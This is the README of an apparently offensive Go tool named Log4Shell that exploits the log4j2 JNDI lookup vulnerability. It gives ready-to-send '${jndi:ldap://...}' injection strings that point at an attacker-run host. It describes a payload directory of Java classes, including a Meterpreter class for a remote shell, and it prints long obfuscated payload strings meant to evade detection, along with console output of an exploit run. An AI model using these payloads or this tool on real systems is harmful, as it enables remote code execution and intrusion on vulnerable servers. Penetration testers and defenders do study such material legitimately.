# Log4Shell
 [![Go Report Card](https://goreportcard.com/badge/github.com/For-ACGN/Log4Shell)](https://goreportcard.com/report/github.com/For-ACGN/Log4Shell)
 [![GoDoc](https://godoc.org/github.com/For-ACGN/Log4Shell?status.svg)](http://godoc.org/github.com/For-ACGN/Log4Shell)
 [![License](https://img.shields.io/github/license/For-ACGN/Log4Shell.svg)](https://github.com/For-ACGN/Log4Shell/blob/master/LICENSE)
 * Check, exploit, obfuscate, TLS, ACME about log4j2 vulnerability in one Go program. 
 * Support common operating systems, not need install any dependency.
 * Don't need to install anything except you want to develop this project.

## Feature
 * Only one program and easy deployment
 * Support multi Java class files
 * Support LDAPS and HTTPS server
 * Support ACME to sign certificate
 * Support obfuscate malicious(payload)
 * Hide malicious(payload) string
 * Add secret to protect HTTP server
 * Add token to fix repeat execute payload

## Usage
 ### Start Log4Shell server
   * ```Log4Shell.exe -host "1.1.1.1"```
   * ```Log4Shell.exe -host "example.com"```
 
 ### Start Log4Shell server with TLS
   * ```Log4Shell.exe -host "example.com" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"```
   * ```Log4Shell.exe -host "1.1.1.1" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"``` (need IP SANs)

 ### Start Log4Shell server with ACME
   * ```Log4Shell.exe -host "example.com" -auto-cert``` (must use domain name)

 ### Obfuscate malicious(payload) string
   ```
   Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/Calc}"
   ```
   ```
   raw: ${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}

   ${zrch-Q(NGyN-yLkV:-}${j${sm:Eq9QDZ8-xEv54:-ndi}${GLX-MZK13n78y:GW2pQ:-:l}${ckX:2@BH[)]Tmw:a(:-
   da}${W(d:KSR)ky3:bv78UX2R-5MV:-p:/}/1.${)U:W9y=N:-}${i9yX1[:Z[Ve2=IkT=Z-96:-1.1}${[W*W:w@q.tjyo
   @-vL7thi26dIeB-HxjP:-.1}:38${Mh:n341x.Xl2L-8rHEeTW*=-lTNkvo:-90/}${sx3-9GTRv:-Cal}c$c${HR-ewA.m
   Q:g6@jJ:-z}3z${uY)u:7S2)P4ihH:M_S8fanL@AeX-PrW:-]}${S5D4[:qXhUBruo-QMr$1Bd-.=BmV:-}${_wjS:BIY0s
   :-Y_}p${SBKv-d9$5:-}Wx${Im:ajtV:-}AoL${=6wx-_HRvJK:-P}W${cR.1-lt3$R6R]x7-LomGH90)gAZ:NmYJx:-}h}

   Each string can only be used once, or wait 20 seconds.
   ```
   ```
   When obfuscate malicious(payload) string, log4j2 package will repeat execute it, the number
   of repetitions is equal the number of occurrences about string "${". The LDAP server add a
   simple token mechanism for prevent it. 
   ```
   
  ### Hide malicious(payload) string
   ```
   Log4Shell.exe -obf "${jndi:ldap://127.0.0.1:3890/Calc}" -add-dollar
   ```
   ```
   raw: ${jndi:ldap://127.0.0.1:3890/Calc$YG=.z[.od7rH0XpE}
   ```
   ```
   Execute VulApp:
   
   E:\OneDrive\Projects\Golang\GitHub\Log4Shell\vulapp\jar>D:\Java\jdk1.8.0_121\bin\java -jar 
   vulapp.jar ${j${0395i1-WV[nM-Pv:-nd}i${KoxnAt-KVA6T4:Xggnr:-}:${vlt0_:xTI:-}${kMe=A:QD3FK:
   -l}d${SaS-TmMt:-a}${uQH-oRFIXtw-4[:-}p:${XL9-bkp9k]-xz:-//}12${D@-rF@wGm:-7.0}.${Fuc:SCV6B
   m:-}${W1eelS:1jnUDknTJS:*7aHahf2m:vK:-0.1}${ft:4Zbf5Hf1G:Tskg:-:3}${6WH[wc:Fencc:-8}${24Y:
   5h=5SqK-p(X9:-9}${oYCk6-RDIN5a$Od:U]3iOEVv:7MiEj:-0/C}${NzvB:]6T9$_O9-F.IUl-NnZq:-a}lc$YG=
   ${*E-5M:-.z[}${N_9@-6(l0sy-b(6.6t-y7NC*:-}${0i-4eS4kB:-.}${5WnL-LKTO554q-x[d:-od7}rH0$${oC
   :.XYPyzv6-sPH.]*Ls:$@Q:-XpE}}
   ${j${0395i1-WV[nM-Pv:-nd}i${KoxnAt-KVA6T4:Xggnr:-}:${vlt0_:xTI:-}${kMe=A:QD3FK:-l}d${SaS-T
   mMt:-a}${uQH-oRFIXtw-4[:-}p:${XL9-bkp9k]-xz:-//}12${D@-rF@wGm:-7.0}.${Fuc:SCV6Bm:-}${W1eel
   S:1jnUDknTJS:*7aHahf2m:vK:-0.1}${ft:4Zbf5Hf1G:Tskg:-:3}${6WH[wc:Fencc:-8}${24Y:5h=5SqK-p(X
   9:-9}${oYCk6-RDIN5a$Od:U]3iOEVv:7MiEj:-0/C}${NzvB:]6T9$_O9-F.IUl-NnZq:-a}lc$YG=${*E-5M:-.z
   [}${N_9@-6(l0sy-b(6.6t-y7NC*:-}${0i-4eS4kB:-.}${5WnL-LKTO554q-x[d:-od7}rH0$${oC:.XYPyzv6-s
   PH.]*Ls:$@Q:-XpE}}
   15:49:14.676 [main] ERROR log4j - XpE}

   E:\OneDrive\Projects\Golang\GitHub\Log4Shell\vulapp\jar>
   ```
   ```
   The Logger will only record a part of raw string "15:49:14.676 [main] ERROR log4j - XpE}",
   and repeat execute will not appear(I don't know why this happened).
   ```

## Check
 * start Log4Shell server
 * send ```${jndi:ldap://1.1.1.1:3890/Nop}```
 * send ```${jndi:ldaps://example.com:3890/Nop}``` with TLS

## Exploit
 * start Log4Shell server
 * put your class file to the payload directory
 * send ```${jndi:ldap://1.1.1.1:3890/Meterpreter}```
 * send ```${jndi:ldaps://example.com:3890/Meterpreter}``` with TLS
 * meterpreter will open source after some time

## VulApp
 * VulApp is a vulnerable Java program that use log4j2 package.
 * You can use it for develop this project easily.
 * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1:3890/Calc}```

## Help
  ```
  :::      ::::::::   ::::::::      :::     ::::::::  :::    ::: :::::::::: :::      :::
  :+:     :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+: :+:        :+:      :+:
  +:+     +:+    +:+ +:+          +:+ +:+  +:+        +:+    +:+ +:+        +:+      +:+
  +#+     +#+    +:+ :#:         +#+  +:+  +#++:++#++ +#++:++#++ +#++:++#   +#+      +#+
  +#+     +#+    +#+ +#+   +#+# +#+#+#+#+#+       +#+ +#+    +#+ +#+        +#+      +#+
  #+#     #+#    #+# #+#    #+#       #+#  #+#    #+# #+#    #+# #+#        #+#      #+#
  ######## ########   ########        ###   ########  ###    ### ########## ######## ########

                                                        https://github.com/For-ACGN/Log4Shell

Usage of Log4Shell.exe:
  -add-dollar
        add one dollar to the obfuscated string
  -auto-cert
        use ACME client to sign certificate automatically
  -host string
        server IP address or domain name (default "127.0.0.1")
  -http-addr string
        http server address (default ":8080")
  -http-net string
        http server network (default "tcp")
  -ldap-addr string
        ldap server address (default ":3890")
  -ldap-net string
        ldap server network (default "tcp")
  -no-token
        not add random token when use obfuscate
  -obf string
        obfuscate malicious(payload) string
  -payload string
        payload(java class) directory (default "payload")
  -tls-cert string
        tls certificate file path (default "cert.pem")
  -tls-key string
        tls private key file path (default "key.pem")
  -tls-server
        enable ldaps and https server
  ```

## Screenshot
![](https://github.com/For-ACGN/Log4Shell/raw/main/screenshot.png)
